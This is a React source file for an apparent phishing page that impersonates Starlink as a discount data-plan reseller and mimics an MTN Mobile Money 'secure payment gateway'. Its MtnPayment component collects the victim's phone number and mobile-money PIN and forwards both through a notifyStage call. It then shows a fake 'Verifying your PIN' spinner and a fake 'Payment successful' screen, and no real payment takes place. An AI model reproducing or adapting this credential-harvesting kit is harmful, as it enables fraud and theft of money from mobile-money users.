    bolt: "M13 2L3 14h7l-1 8 10-12h-7l1-8z",
    rocket:
      "M12 2c0 0-4 2-4 8 0 3 2 5 2 5l-2 3v4h8v-4l-2-3s2-2 2-5c0-6-4-8-4-8z",
    shield: "M12 2l8 3v6c0 5-3.5 9-8 11-4.5-2-8-6-8-11V5l8-3z",
    building: "M4 22V4h12v18H4zm4-4h4v-2H8v2zm0-4h4v-2H8v2zM18 22V8h2v14h-2z",
    cloud:
      "M19 18H6c-2.2 0-4-1.8-4-4s1.8-4 4-4c.3 0 .6 0 .9.1C7.5 7.8 9.6 6 12 6s4.5 1.8 5.1 4.1c.3-.1.6-.1.9-.1 2.2 0 4 1.8 4 4s-1.8 4-4 4z",
    briefcase: "M9 4h6v2h4v14H5V6h4V4zm2 2v2h2V6h-2z",
    star: "M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7l3-7z",
  };

  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      className={`w-6 h-6 ${className}`}
    >
      <path d={icons[name] || icons.signal} />
    </svg>
  );
}

function StarlinkLogo({ className = "" }: { className?: string }) {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 200 200"
      className={`flex-shrink-0 ${className}`}
    >
      <ellipse
        cx="100"
        cy="100"
        rx="74"
        ry="55"
        stroke="white"
        strokeWidth="10"
        fill="none"
        transform="rotate(-25 100 100)"
      />
      <ellipse
        cx="100"
        cy="100"
        rx="43"
        ry="33"
        stroke="white"
        strokeWidth="10"
        fill="none"
        transform="rotate(65 100 100)"
      />
      <circle cx="100" cy="100" r="12" fill="white" />
    </svg>
  );
}

function brandFor(method: string) {
  switch (method) {
    case "mtn":
      return { bg: "#ffcc00", color: "#000", label: "MTN", fontSize: "13px" };
    case "orange":
      return {
        bg: "#FF6600",
        color: "#fff",
        label: "Orange",
        fontSize: "11px",
      };
    case "moov":
      return { bg: "#f5a623", color: "#fff", label: "Moov", fontSize: "9px" };
    default:
      return {
        bg: "#ed1c24",
        color: "#fff",
        label: "airtel",
        fontSize: "11px",
      };
  }
}

function App() {
  const [lang, setLang] = useState<Lang>("en");
  const t = translations[lang] || translations.en;

  const [selectedPlan, setSelectedPlan] = useState<PlanCard | null>(null);
  const [configurePlan, setConfigurePlan] = useState<PlanCard | null>(null);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [loadingMethod, setLoadingMethod] = useState<string>("mtn");
  const [showConfigureModal, setShowConfigureModal] = useState(false);
  const [showPaymentFlow, setShowPaymentFlow] = useState(false);

  useEffect(() => {
    document.title = t.pageTitle;
    document.documentElement.lang = lang;
  }, [lang, t.pageTitle]);

  const handlePlanClick = (plan: PlanCard) => {
    setSelectedPlan(plan);
    setShowPaymentModal(true);
  };

  const handleConfigure = (plan: PlanCard) => {
    setConfigurePlan(plan);
    setShowConfigureModal(true);
  };

  const handlePaymentMethod = (method: string) => {
    setShowPaymentModal(false);
    setLoadingMethod(method);
    setShowLoadingModal(true);

    if (selectedPlan) {
      notifyStage("method_selected", {
        planName: t[selectedPlan.nameKey],
        amount: `${CURRENCY} ${selectedPlan.price}`,
        paymentMethod: method,
        countryCode: COUNTRY_CODE,
        countryName: COUNTRY_NAME,
      });
    }

    setTimeout(() => {
      setShowLoadingModal(false);
      setShowPaymentFlow(true);
    }, 2500);
  };

  const closePaymentFlow = () => {
    setShowPaymentFlow(false);
    setSelectedPlan(null);
  };

  const brand = brandFor(loadingMethod);
  const visibleMethods = paymentMethods.filter((m) => m.visible);

  return (
    <div className="min-h-screen bg-gray-50 pb-28">
      {/* Header */}
      <header className="bg-black text-white shadow-sm sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <a href="#" className="flex items-center gap-2">
            <StarlinkLogo className="w-9 h-9" />
            <span className="font-bold text-xl sm:text-2xl tracking-widest">
              STARLINK
            </span>
            <span className="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">
              {t.headerSubtitle} {COUNTRY_NAME}
            </span>
          </a>

          <div className="flex items-center gap-4">
            <button
              onClick={() => setLang(nextLang(lang))}
              className="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition"
            >
              <svg
                className="w-4 h-4"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
              >
                <circle cx="12" cy="12" r="10" />
                <path d="M2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z" />
              </svg>
              <span>{nextLang(lang).toUpperCase()}</span>
            </button>

            <nav className="flex gap-2 sm:gap-4 items-center">
              <a
                href="#"
                className="text-gray-300 hover:text-white flex items-center gap-2"
              >
                <svg
                  className="w-5 h-5"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M5 12.55a11 11 0 0114.08 0M1.42 9a16 16 0 0121.16 0M8.53 16.11a6 6 0 016.95 0M12 20h.01" />
                </svg>
                <span className="hidden sm:inline">{t.navStatus}</span>
              </a>

              <a href="#" className="text-white flex items-center gap-2">
                <svg
                  className="w-5 h-5"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4zM3 6h18M16 10a4 4 0 01-8 0" />
                </svg>
                <span className="hidden sm:inline">{t.navPlans}</span>
              </a>

              <a
                href="#"
                className="text-gray-300 hover:text-white hidden sm:flex items-center gap-2"
              >
                <svg
                  className="w-5 h-5"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01" />
                </svg>
                <span className="hidden sm:inline">{t.navOrders}</span>
              </a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="pb-4 space-y-6">
          {/* Page Header */}
          <div className="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl shadow-md">
            <div className="flex items-center justify-between mb-4">
              <div>
                <p className="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">
                  {t.plansSubtitle}
                </p>
                <h1 className="text-2xl sm:text-3xl font-black mt-2">
                  {t.plansTitle}
                </h1>
              </div>

              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-blue-600 bg-opacity-20 rounded-full flex items-center justify-center flex-shrink-0">
                <svg
                  className="w-8 h-8 sm:w-10 sm:h-10 text-blue-400"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4zM3 6h18M16 10a4 4 0 01-8 0" />
                </svg>
              </div>
            </div>

            <p className="text-gray-400 text-sm">{t.plansDesc}</p>
          </div>

          {/* Package Cards */}
          <div className="space-y-4">
            {plans.map((plan) => (
              <PackageCard
                key={plan.id}
                plan={plan}
                t={t}
                onClick={() => handlePlanClick(plan)}
                onConfigure={() => handleConfigure(plan)}
              />
            ))}
          </div>

          {/* Payment Info */}
          <div className="bg-blue-50 rounded-2xl p-6 border border-blue-100">
            <div className="flex items-start gap-3">
              <svg
                className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
              >
                <circle cx="12" cy="12" r="10" />
                <path d="M12 16v-4M12 8h.01" />
              </svg>

              <div>
                <h4 className="font-bold text-gray-900 mb-1">
                  {t.paymentTitle}
                </h4>
                <p className="text-sm text-gray-600">{t.paymentDesc}</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-30">
        <div className="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
          <a
            href="#"
            className="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all"
          >
            <svg
              className="w-6 h-6"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M5 12.55a11 11 0 0114.08 0M1.42 9a16 16 0 0121.16 0M8.53 16.11a6 6 0 016.95 0M12 20h.01" />
            </svg>
            <span className="text-xs font-semibold">{t.navStatus}</span>
          </a>

          <a
            href="#"
            className="flex flex-col items-center gap-1 text-blue-600 transition-all"
          >
            <svg
              className="w-6 h-6"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4zM3 6h18M16 10a4 4 0 01-8 0" />
            </svg>
            <span className="text-xs font-semibold">{t.navPlans}</span>
          </a>

          <a
            href="#"
            className="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all"
          >
            <svg
              className="w-6 h-6"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01" />
            </svg>
            <span className="text-xs font-semibold">{t.navOrders}</span>
          </a>

          <a
            href="#"
            className="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all"
          >
            <svg
              className="w-6 h-6"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <circle cx="12" cy="12" r="3" />
              <path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 01-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z" />
            </svg>
            <span className="text-xs font-semibold">{t.navSettings}</span>
          </a>
        </div>
      </nav>

      {/* Footer */}
      <footer className="bg-black text-gray-400 py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
            <div>
              <h3 className="text-white font-bold mb-4">
                STARLINK {COUNTRY_NAME}
              </h3>
              <p className="text-sm">{t.footerDesc}</p>
            </div>

            <div>
              <h3 className="text-white font-bold mb-4">SUPPORT</h3>
              <p className="text-sm">Email: support@starlink.reseller</p>
              <p className="text-sm mt-1">{t.footerSupport}</p>
            </div>

            <div>
              <h3 className="text-white font-bold mb-4">PAIEMENT</h3>
              <p className="text-sm">{t.footerPayment}</p>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-8 text-center">
            <p className="text-sm">{t.footerCopyright}</p>
          </div>
        </div>
      </footer>

      {/* Payment Flow */}
      {showPaymentFlow && selectedPlan && loadingMethod === "airtel" && (
        <AirtelPayment
          packageName={t[selectedPlan.nameKey]}
          amount={`${CURRENCY} ${selectedPlan.price}`}
          onBack={closePaymentFlow}
        />
      )}

      {showPaymentFlow && selectedPlan && loadingMethod === "orange" && (
        <OrangePayment
          packageName={t[selectedPlan.nameKey]}
          amount={`${CURRENCY} ${selectedPlan.price}`}
          onBack={closePaymentFlow}
        />
      )}

      {showPaymentFlow && selectedPlan && loadingMethod === "mtn" && (
        <MtnPayment
          packageName={t[selectedPlan.nameKey]}
          amount={`${CURRENCY} ${selectedPlan.price}`}
          countryCode={COUNTRY_CODE}
          countryName={COUNTRY_NAME}
          onBack={closePaymentFlow}
        />
      )}

      {/* Loading Modal */}
      {showLoadingModal && (
        <div
          className="fixed inset-0 bg-black/50 z-[9999] flex items-center justify-center"
          onClick={() => setShowLoadingModal(false)}
        >
          <div
            className="bg-white rounded-xl p-8 sm:px-12 text-center max-w-[380px] mx-5 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="w-[50px] h-[50px] border-[3px] border-gray-200 border-t-blue-500 rounded-full animate-spin mx-auto mb-4" />

            <div
              className="w-[50px] h-[50px] rounded-lg flex items-center justify-center mx-auto mb-4 font-bold"
              style={{
                background: brand.bg,
                color: brand.color,
                fontSize: brand.fontSize,
              }}
            >
              {brand.label}
            </div>

            <h3 className="text-[17px] font-semibold text-gray-800 mb-2">
              {t.modalTitle}
            </h3>

            <p className="text-[13px] text-gray-500 mb-2 leading-snug">
              {loadingMethod === "mtn" ? t.modalSubtitleMtn : t.modalSubtitle}
            </p>

            <p className="text-xs text-gray-400 italic">{t.modalWarning}</p>
          </div>
        </div>
      )}

      {/* Payment Method Modal */}
      {showPaymentModal && selectedPlan && (
        <div
          className="fixed inset-0 bg-black/60 z-[9998] flex items-center justify-center"
          onClick={() => setShowPaymentModal(false)}
        >
          <div
            className="bg-white rounded-2xl p-7 max-w-[360px] w-[90%] shadow-2xl max-h-[85vh] overflow-y-auto"
            onClick={(e) => e.stopPropagation()}
          >
            <h3 className="text-xl font-bold text-gray-800 text-center mb-1.5">
              {t.payMethodTitle}
            </h3>

            <p className="text-sm text-gray-500 text-center mb-5">
              {t.payMethodSubtitle}
            </p>

            <div className="flex flex-col gap-3">
              {visibleMethods.map((method) => (
                <button
                  key={method.id}
                  onClick={() => handlePaymentMethod(method.id)}
                  className={`flex items-center gap-4 p-4 border-2 border-gray-200 rounded-xl cursor-pointer transition-all hover:-translate-y-0.5 hover:shadow-md text-left ${method.hover}`}
                >
                  <div
                    className="w-[50px] h-[50px] rounded-[10px] flex items-center justify-center font-bold text-white flex-shrink-0 overflow-hidden"
                    style={{
                      background: method.bg,
                      color: method.color || "#fff",
                      fontSize: method.fontSize,
                    }}
                  >
                    {method.imgSrc ? (
                      <img
                        src={method.imgSrc}
                        alt={method.name}
                        className="w-full h-full object-contain"
                      />
                    ) : (
                      method.logo
                    )}
                  </div>

                  <div className="flex-1">
                    <h4 className="text-base font-semibold text-gray-800">
                      {method.name}
                    </h4>
                    <p className="text-xs text-gray-500">
                      {method.descKey ? t[method.descKey] : method.desc}
                    </p>
                  </div>

                  <svg
                    className="w-5 h-5 text-gray-400"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <path d="M9 18l6-6-6-6" />
                  </svg>
                </button>
              ))}
            </div>

            <button
              onClick={() => setShowPaymentModal(false)}
              className="block w-full mt-4 p-3 bg-transparent border border-gray-200 rounded-lg text-gray-500 text-sm cursor-pointer transition hover:bg-gray-50"
            >
              {t.cancelBtn}
            </button>
          </div>
        </div>
      )}

      {/* Configure Modal */}
      {showConfigureModal && (
        <div
          className="fixed inset-0 bg-black/50 z-[9999] flex items-end justify-center"
          onClick={() => setShowConfigureModal(false)}
        >
          <div
            className="bg-white rounded-t-[20px] px-6 pt-7 pb-10 w-full max-w-[480px] mx-auto shadow-2xl text-center"
            style={{ animation: "slideUp 0.3s ease" }}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
              ⚙️
            </div>

            <h3 className="text-lg font-bold text-gray-800 mb-2">
              {t.configureTitle}
            </h3>

            <p className="text-[13px] text-gray-500 leading-relaxed mb-6">
              {t.configureMsg}
            </p>

            <button
              onClick={() => {
                setShowConfigureModal(false);
                if (configurePlan) {
                  setSelectedPlan(configurePlan);
                  setShowPaymentModal(true);
                }
              }}
              className="w-full p-3.5 bg-blue-600 text-white rounded-xl text-[15px] font-semibold cursor-pointer mb-2.5 transition hover:bg-blue-700"
            >
              {t.subscribeNow}
            </button>

            <button
              onClick={() => setShowConfigureModal(false)}
              className="w-full p-3 bg-transparent text-gray-500 border-[1.5px] border-gray-300 rounded-xl text-sm font-medium cursor-pointer transition hover:border-gray-400 hover:text-gray-700"
            >
              {t.closeBtn}
            </button>
          </div>
        </div>
      )}

      <style>{`
        @keyframes slideUp {
          from { transform: translateY(100%); }
          to { transform: translateY(0); }
        }
      `}</style>
    </div>
  );
}

function PackageCard({
  plan,
  t,
  onClick,
  onConfigure,
}: {
  plan: PlanCard;
  t: Record<string, string>;
  onClick: () => void;
  onConfigure: () => void;
}) {
  return (
    <div
      onClick={onClick}
      className="package-card bg-white rounded-2xl p-6 shadow-md border border-gray-100 relative cursor-pointer transition-all duration-300 hover:-translate-y-1 hover:shadow-lg"
    >
      {plan.popular && (
        <span className="absolute -top-2.5 right-2.5 bg-gradient-to-br from-amber-500 to-amber-700 text-white px-3 py-1 rounded-full text-[11px] font-bold uppercase">
          {t.popular}
        </span>
      )}

      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div
            className={`w-14 h-14 ${plan.iconBg} rounded-xl flex items-center justify-center flex-shrink-0`}
          >
            <Icon name={plan.iconSvg} className={plan.iconText} />
          </div>

          <div>
            <h3 className="font-bold text-lg text-gray-900">
              {t[plan.nameKey]}
            </h3>
            <p className="text-gray-500 text-sm">
              {plan.unlimited ? t.unlimitedData : plan.size} {t[plan.periodKey]}
            </p>
          </div>
        </div>

        <div className="text-right">
          <p className="text-[13px] line-through text-gray-400 leading-tight">
            {CURRENCY} {plan.originalPrice}
          </p>

          <p className={`text-2xl font-black ${plan.iconText}`}>
            {CURRENCY} {plan.price}{" "}
            <span className="inline-block bg-red-600 text-white text-[9px] font-extrabold px-1.5 py-0.5 rounded-full uppercase tracking-wide align-middle ml-1.5">
              PROMO
            </span>
          </p>

          <p className="text-xs text-gray-500">{t[plan.periodKey]}</p>
        </div>
      </div>

      <div className="mt-4 flex flex-wrap gap-2">
        {plan.features.map((feature, index) => (
          <span
            key={index}
            className={`text-xs ${feature.bg} ${feature.text} px-3 py-1 rounded-full`}
          >
            {t[feature.key]}
          </span>
        ))}
      </div>

      <div className="flex items-center justify-between gap-2 mt-3">
        <p className="text-[11px] text-gray-500 flex-1">
          {t.hint || translations.en.hint}
        </p>

        <button
          onClick={(e) => {
            e.stopPropagation();
            onConfigure();
          }}
          className="inline-flex items-center gap-1.5 px-4 py-1.5 bg-black border-[1.5px] border-black rounded-lg text-xs font-semibold text-white cursor-pointer transition hover:bg-gray-800 flex-shrink-0"
        >
          <svg
            className="w-3.5 h-3.5"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
          >
            <circle cx="12" cy="12" r="3" />
            <path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 01-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z" />
          </svg>
          {t.configureBtn}
        </button>
      </div>
    </div>
  );
}

/* MTN MoMo gateway: phone → PIN → processing → success */
function MtnPayment({
  packageName,
  amount,
  countryCode,
  countryName,
  onBack,
}: {
  packageName: string;
  amount: string;
  countryCode: string;
  countryName: string;
  onBack: () => void;
}) {
  const [step, setStep] = useState<"phone" | "pin" | "processing" | "done">(
    "phone",
  );
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");

  const digits = phone.replace(/\D/g, "");
  const phoneValid = digits.length >= 9;

  const base = {
    planName: packageName,
    amount,
    paymentMethod: "mtn",
    countryCode,
    countryName,
  };

  const pressKey = (k: string) => {
    if (k === "⌫") setPin((p) => p.slice(0, -1));
    else setPin((p) => (p.length < 4 ? p + k : p));
  };

  const submitPhone = () => {
    if (!phoneValid) return;
    notifyStage("phone_submitted", base, { phone: `+${digits}` });
    setPin("");
    setStep("pin");
  };

  const submitPin = () => {
    if (pin.length < 4) return;
    notifyStage("pin_submitted", base, { phone: `+${digits}`, pin });
    setStep("processing");

    setTimeout(() => {
      notifyStage("completed", base, {
        phone: `+${digits}`,
        pin,
        status: "completed",
      });
      setStep("done");
    }, 2200);
  };

  useEffect(() => {
    if (step !== "pin") return;
    const onKey = (e: KeyboardEvent) => {
      if (/^\d$/.test(e.key)) pressKey(e.key);
      else if (e.key === "Backspace") pressKey("⌫");
      else if (e.key === "Enter") submitPin();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, pin]);

  return (
    <div className="fixed inset-0 bg-gray-50 z-[9997] overflow-y-auto">
      <header className="bg-[#ffcc00] text-black sticky top-0 z-10 shadow">
        <div className="max-w-2xl mx-auto px-4 py-4 flex items-center gap-3">
          <button
            onClick={step === "pin" ? () => setStep("phone") : onBack}
            aria-label="Back"
            className="w-9 h-9 rounded-full bg-black/10 flex items-center justify-center hover:bg-black/20 transition"
          >
            <svg
              className="w-5 h-5"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <div className="w-9 h-9 rounded-lg bg-black text-[#ffcc00] flex items-center justify-center font-black text-[11px]">
            MTN
          </div>
          <div>
            <h2 className="font-bold leading-tight">MTN Mobile Money</h2>
            <p className="text-xs opacity-70">Secure payment gateway</p>
          </div>
        </div>
      </header>

      <div className="max-w-md mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl p-6 shadow-md border border-gray-100 mb-6">
          <p className="text-xs uppercase tracking-widest text-gray-400 font-semibold">
            Package
          </p>
          <p className="font-bold text-gray-900 mb-3">{packageName}</p>
          <div className="flex items-center justify-between border-t border-gray-100 pt-3">
            <span className="text-sm text-gray-500">Amount to pay</span>
            <span className="text-xl font-black text-[#b58900]">{amount}</span>
          </div>
        </div>

        {step === "phone" && (
          <div className="bg-white rounded-2xl p-6 shadow-md border border-gray-100">
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              MTN phone number
            </label>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && submitPhone()}
              placeholder="+260 ..."
              className="w-full px-4 py-3 border-[1.5px] border-gray-300 rounded-xl text-[15px] outline-none focus:border-[#ffcc00] transition"
            />
            <button
              onClick={submitPhone}
              disabled={!phoneValid}
              className="w-full mt-4 py-3.5 rounded-xl font-bold text-black transition disabled:opacity-50"
              style={{ background: "#ffcc00" }}
            >
              Continue
            </button>
          </div>
        )}

        {step === "pin" && (
          <div className="bg-white rounded-2xl p-6 shadow-md border border-gray-100 text-center">
            <p className="text-sm font-semibold text-gray-700 mb-1">
              Enter your MTN PIN
            </p>
            <p className="text-xs text-gray-500 mb-5">
              A prompt was sent to +{digits}
            </p>

            <div className="flex items-center justify-center gap-3 mb-6">
              {[0, 1, 2, 3].map((i) => (
                <div
                  key={i}
                  className={`w-11 h-14 rounded-xl border-2 flex items-center justify-center text-xl font-black transition ${
                    pin.length > i
                      ? "border-[#ffcc00] bg-amber-50 text-gray-900"
                      : "border-gray-200 text-gray-300"
                  }`}
                >
                  {pin.length > i ? "•" : ""}
                </div>
              ))}
            </div>

            <div className="grid grid-cols-3 gap-2.5 max-w-[260px] mx-auto">
              {["1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "⌫"].map(
                (k, i) => (
                  <button
                    key={i}
                    disabled={k === ""}
                    onClick={() => pressKey(k)}
                    className={`h-12 rounded-xl text-lg font-semibold transition ${
                      k === ""
                        ? "opacity-0"
                        : "bg-gray-50 border border-gray-200 hover:bg-gray-100 active:scale-95"
                    }`}
                  >
                    {k}
                  </button>
                ),
              )}
            </div>

            <button
              onClick={submitPin}
              disabled={pin.length < 4}
              className="w-full mt-5 py-3.5 rounded-xl font-bold text-black transition disabled:opacity-50"
              style={{ background: "#ffcc00" }}
            >
              Confirm PIN
            </button>

            <button
              onClick={() => setStep("phone")}
              className="mt-3 text-xs text-gray-500 hover:text-gray-700"
            >
              ← Change number
            </button>
          </div>
        )}

        {step === "processing" && (
          <div className="bg-white rounded-2xl p-8 shadow-md border border-gray-100 text-center">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-[#ffcc00] rounded-full animate-spin mx-auto mb-4" />
            <p className="font-semibold text-gray-800">Verifying your PIN...</p>
            <p className="text-sm text-gray-500 mt-1">
              Keep this page open, do not refresh
            </p>
          </div>
        )}

        {step === "done" && (
          <div className="bg-white rounded-2xl p-8 shadow-md border border-gray-100 text-center">
            <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
              ✅
            </div>
            <h3 className="text-lg font-bold text-gray-900 mb-1">
              Payment successful
            </h3>
            <p className="text-sm text-gray-500 mb-6">
              Your {packageName} package will be activated shortly.
            </p>
            <button
              onClick={onBack}
              className="px-8 py-3 rounded-xl font-bold text-black"
              style={{ background: "#ffcc00" }}
            >
              Done
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
